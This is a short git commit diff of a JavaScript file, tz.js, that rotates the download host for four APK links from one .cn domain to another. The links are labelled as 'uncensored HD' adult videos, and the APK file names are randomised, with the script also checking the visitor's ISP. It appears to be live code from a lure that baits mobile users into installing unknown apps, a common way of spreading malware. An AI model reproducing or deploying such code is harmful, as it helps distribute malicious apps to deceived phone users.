d438e5d06d7e169b0a6cd53bd64735c1fc701c6a
jipinfuli <as39328@163.com>
2015-10-09 01:28:54 +0800

    Update tz.js

--- tz.js
+++ tz.js
@@ -2,10 +2,10 @@ var name="无码高清";
 var name2="无码高清";
 var name3="无码高清";
 var name4="无码高清";
-var url="http://365pos.com.cn:81/a71iWgDWIzH-" + randomString(6) + ".apk";
-var url2="http://365pos.com.cn:81/a71iWgDWIzH-" + randomString(6) + ".apk";
-var url3="http://365pos.com.cn:81/a71iWgDWIzH-" + randomString(6) + ".apk";
-var url4="http://365pos.com.cn:81/a71iWgDWIzH-" + randomString(6) + ".apk";
+var url="http://lyxinhuazhaoming.cn:81/a71iWgDWIzH-" + randomString(6) + ".apk";
+var url2="http://lyxinhuazhaoming.cn:81/a71iWgDWIzH-" + randomString(6) + ".apk";
+var url3="http://lyxinhuazhaoming.cn:81/a71iWgDWIzH-" + randomString(6) + ".apk";
+var url4="http://lyxinhuazhaoming.cn:81/a71iWgDWIzH-" + randomString(6) + ".apk";
 
 try{
 	var isp=remote_ip_info.isp;
